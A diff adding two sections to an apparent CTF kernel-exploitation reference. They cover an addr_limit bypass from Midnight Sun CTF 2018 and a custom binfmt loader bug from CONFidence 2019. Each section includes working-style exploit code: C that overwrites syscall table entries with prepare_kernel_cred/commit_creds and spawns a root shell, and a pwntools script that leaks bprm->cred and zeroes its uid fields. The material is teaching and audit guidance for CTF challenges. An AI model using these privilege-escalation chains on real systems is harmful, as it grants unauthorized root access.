@@ -13,6 +13,8 @@
 - [Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)](#race-window-extension-via-madv_dontneed--mprotect-dicectf-2026)
 - [Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)](#cross-cache-attack-via-cpu-split-strategy-dicectf-2026)
 - [PTE Overlap Primitive for File Write (DiceCTF 2026)](#pte-overlap-primitive-for-file-write-dicectf-2026)
+- [Kernel addr_limit Bypass via Failed File Open (Midnight Sun CTF 2018)](#kernel-addr_limit-bypass-via-failed-file-open-midnight-sun-ctf-2018)
+- [Custom binfmt Loader OOB Read + clear_user for Privesc (CONFidence Teaser 2019)](#custom-binfmt-loader-oob-read--clear_user-for-privesc-confidence-teaser-2019)
 
 For kernel fundamentals (environment setup, heap spray structures, stack overflow, privilege escalation, modprobe_path, core_pattern), see [kernel.md](kernel.md).
 
@@ -279,3 +281,86 @@ system("/bin/umount /tmp 2>/dev/null");
 ```
 
 **Key insight:** PTE pages are just regular physical pages repurposed by the kernel's page table allocator. If a freed slab page is reclaimed as a PTE page, both the original (corrupted) slab entries and the new PTE entries coexist. By carefully overlapping anonymous and file-backed mappings in the same PTE page, writes to the anonymous mapping transparently modify file-backed pages — achieving arbitrary file write without any direct kernel write primitive. This bypasses all standard file permission checks since the write happens at the physical page level.
+
+---
+
+## Kernel addr_limit Bypass via Failed File Open (Midnight Sun CTF 2018)
+
+**Pattern:** Kernel module calls `set_fs(KERNEL_DS)` to access userspace pointers, but if a subsequent file open fails, it returns without restoring the old `addr_limit`. Force the failure by making the target file a directory. Now user-space `read()` can access kernel memory.
+
+**Exploitation strategy:**
+1. The kernel module has a debug function that sets `addr_limit = KERNEL_DS` to read a debug file
+2. If `filp_open()` fails (e.g., target is a directory, not a file), the error path returns early
+3. The error path does NOT restore `addr_limit` to its previous value (`USER_DS`)
+4. The calling process now has `addr_limit = KERNEL_DS` permanently
+5. Ordinary `read()`/`write()` syscalls can now access kernel memory addresses
+6. Use this to overwrite syscall table entries with `prepare_kernel_cred`/`commit_creds`
+
+```c
+#include <sys/stat.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define DEBUG_FILE "/tmp/debug_log"
+#define SYS_TABLE_ADDR 0xffffffff81801400  // from /proc/kallsyms
+
+// Step 1: Make debug file a directory -> filp_open() fails with -EISDIR
+mkdir(DEBUG_FILE, 0);
+
+// Step 2: Trigger the kernel module's debug function
+int fd = open("/dev/vuln_module", O_RDWR);
+read(fd, &c, 1);  // Triggers debug_msg(), leaves addr_limit = KERNEL_DS
+
+// Step 3: Now read()/write() can access kernel memory
+// Use pipe as a kernel-memory read/write primitive:
+int pipefd[2];
+pipe(pipefd);
+
+// Write prepare_kernel_cred address to syscall 100
+unsigned long pkc_addr = 0xffffffff810a9ef0;  // prepare_kernel_cred
+write(pipefd[1], &pkc_addr, sizeof(pkc_addr));
+read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 100), sizeof(unsigned long));
+
+// Write commit_creds address to syscall 101
+unsigned long cc_addr = 0xffffffff810a9d80;  // commit_creds
+write(pipefd[1], &cc_addr, sizeof(cc_addr));
+read(pipefd[0], (void*)((unsigned long*)SYS_TABLE_ADDR + 101), sizeof(unsigned long));
+
+// Step 4: Call the overwritten syscalls to get root
+int creds = syscall(100, 0);   // prepare_kernel_cred(0)
+syscall(101, creds);            // commit_creds(creds)
+// Now running as root
+system("/bin/sh");
+```
+
+**Key insight:** When a kernel module sets `addr_limit` to `KERNEL_DS` for kernel pointer access but fails to restore it on error paths, userspace processes retain the elevated `addr_limit`. This turns ordinary `read()`/`write()` syscalls into kernel memory read/write primitives. Always audit kernel module error paths for missing `set_fs()` restoration -- triggering the error (e.g., making a file path point to a directory) is often trivial.
+
+**References:** Midnight Sun CTF 2018
+
+---
+
+## Custom binfmt Loader OOB Read + clear_user for Privesc (CONFidence Teaser 2019)
+
+**Pattern (p4fmt):** Kernel module `p4fmt.ko` registers a new `binfmt` handler for files starting with `"P4"`. The loader reads a user-controlled header: `{magic, version, arg, load_count, header_offset, entry}` followed by `load_count` `{addr, length, offset}` entries. Two missing checks make this a full privesc primitive: `header_offset` is used unvalidated as a pointer offset into `bprm->buf[]` (OOB read of the kernel-side `linux_binprm` struct, including `struct cred *cred`), and `loads[i].addr | 8` selects a branch that calls `_clear_user(addr, length)` with fully attacker-controlled arguments — an arbitrary zeroing primitive that runs *before* `install_exec_creds()` commits `bprm->cred`.
+
+```python
+from pwn import *
+
+# Stage 1: leak bprm->cred via OOB header_offset into the kernel-side linux_binprm buffer.
+# load_count=5, header_offset=0x80-0x18 -> loads[] parsed from fields past bprm->buf.
+leak = b'P4' + p8(0) + p8(1) + p32(5) + p64(0x80 - 0x18) + p64(0)
+# Execute -> dmesg "vm_mmap(..., length=<cred_addr>, ...)" reveals the cred pointer.
+
+# Stage 2: zero uid/gid/suid/sgid/euid/egid/fsuid/fsgid in bprm->cred via clear_user.
+# arg=1 with load entries whose addr has bit 3 set -> kernel calls _clear_user(addr, length).
+cred = 0xffff...          # from leak
+entries  = p64(0x7000000 | 7) + p64(0x1000) + p64(0)            # mmap RWX page for shellcode
+entries += p64((cred + 0x10) | 8) + p64(0x48) + p64(0)          # clear_user(cred->uid..fsgid)
+binary   = b'P4' + p8(0) + p8(1) + p32(2) + p64(0x18) + p64(0x7000090) + entries
+binary   = binary.ljust(0x7000090 & 0xfff, b'\x00') + asm(shellcraft.sh())
+# exec -> install_exec_creds sees a cred with uid=0 -> root shell (drop_privileges bypass)
+```
+
+**Key insight:** Custom `binfmt_misc`-style loaders are a fertile target because they parse attacker-supplied headers *before* `install_exec_creds` commits the per-exec credential struct. Any primitive that touches `bprm` in that window (OOB read to leak `bprm->cred`, arbitrary `_clear_user` to zero cred fields, `vm_mmap` with controlled flags/prot for kernel-aided RWX) composes into privesc without needing a traditional kernel memory-corruption chain. Always audit `load_*_binary` functions in custom modules for (a) bounds on header offsets and counts, (b) `access_ok`/range checks on `addr`/`length` arguments passed to `_clear_user`/`copy_to_user`, and (c) side-channel info leaks via `printk`.
+
+**References:** CONFidence CTF 2019 Teaser — p4fmt, writeup 13992
